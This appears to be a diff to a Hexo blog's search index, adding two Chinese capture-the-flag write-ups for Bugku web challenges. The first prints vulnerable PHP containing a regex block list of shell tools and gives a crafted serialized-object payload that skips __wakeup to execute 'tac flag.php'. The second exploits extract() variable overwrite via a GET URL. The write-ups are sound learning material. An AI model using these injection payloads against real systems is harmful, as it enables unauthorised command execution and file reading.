@@ -1,6 +1,49 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Bugku Web 安慰奖</title>
+    <url>/2021/04/27/Bugku-Web-%E5%AE%89%E6%85%B0%E5%A5%96/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web-安慰奖"><a href="#Bugku-Web-安慰奖" class="headerlink" title="Bugku Web 安慰奖"></a>Bugku Web 安慰奖</h1><p>&emsp;&emsp;进入场景一片空白，查看源码发现<code>YmFja3Vwcw==</code>用base64解码得到backups，所以需要查看备份文件，用御剑扫描网站页面，发现了index.php.bak，访问后得到了一段如下的代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $cmd = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$cmd</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            $a = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump($a);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $select = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;分析可知我们需要传入code参数，内容是一段序列化的代码，代码在传入之后会被执行，以此构建payload,同时可以发现通过正则式过滤掉了一些输入，发现tac没有被过滤因此使用tac命令</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $cmd=<span class="string">&#x27;tac flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ctf=<span class="keyword">new</span> ctf();</span><br><span class="line"><span class="keyword">echo</span> serialize($ctf);</span><br><span class="line">;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行后得到<br><code>O:3:&quot;ctf&quot;:2:&#123;s:11:&quot;*username&quot;;s:5:&quot;admin&quot;;s:6:&quot;*cmd&quot;;s:12:&quot;tac flag.php&quot;;&#125;</code><br>为了绕过_wakeup<code>原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</code>，将对象数改为大于3的，同时为了绕过protected，在变量名前后加上%00，此时构造好的URL为<code>http://114.67.246.176:11386/?code=O:3:&quot;ctf&quot;:3:&#123;s:11:&quot;%00*%00username&quot;;s:5:&quot;admin&quot;;s:6:&quot;%00*%00cmd&quot;;s:12:&quot;tac%20flag.php&quot;;&#125;</code><br>之后便得到了flag<br>flag{Unser1alize_and_2CE_Add} </p>
+]]></content>
+      <tags>
+        <tag>Bugku Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku Web30</title>
+    <url>/2021/04/27/Bugku-Web30/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web30"><a href="#Bugku-Web30" class="headerlink" title="Bugku Web30"></a>Bugku Web30</h1><blockquote>
+<p>描述：txt</p>
+</blockquote>
+<p>&emsp;&emsp;进入场景，看到如下的代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="string">&quot; <span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;其中的几个函数的功能分别如下所示：</p>
+<p>&emsp;&emsp;extract()   </p>
+<p>&emsp;&emsp;函数从数组中将变量导入到当前的符号表。  </p>
+<p>&emsp;&emsp;语法：<code>extract(array,extract_rules,prefix)</code>  </p>
+<p>&emsp;&emsp;该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。</p>
+<p>&emsp;&emsp;file_get_contents()</p>
+<p>&emsp;&emsp;把整个文件读入一个字符串中。</p>
+<p>&emsp;&emsp;语法：</p>
+<p>&emsp;&emsp;<code>file_get_contents(path,include_path,context,start,max_length)</code></p>
+<p>&emsp;&emsp;该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</p>
+<p>&emsp;&emsp;trim()</p>
+<p>&emsp;&emsp;函数移除字符串两侧的空白字符或其他预定义字符。</p>
+<p>&emsp;&emsp;语法<code>trim(string,charlist)</code></p>
+<p>&emsp;&emsp;经过分析，该段代码是将通过GET方法传入的参数赋值给其中某个变量，传入的参数如果和$fn文件中的字符一致时，便可以得到flag，题目的提示是txt，尝试访问flag.txt,浏览器显示了一下内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bugku</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;因此$ac的值便应该是bugku，此时尝试构造输入<code>http://114.67.246.176:11360/?ac=bugku</code>结果返回了sorry！，可能fn也需要传值，再构造<code>http://114.67.246.176:11360/?ac=bugku&amp;fn=flag.txt</code>,此时正确返回了flag</p>
+<p><img src="https://i.loli.net/2021/04/27/OI9cKMUoXQWZmax.png" alt="1.png"></p>
+]]></content>
+      <tags>
+        <tag>Bugku Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Bugku Web29</title>
     <url>/2021/04/26/Bugku-Web29/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web29"><a href="#Bugku-Web29" class="headerlink" title="Bugku Web29"></a>Bugku Web29</h1><blockquote>
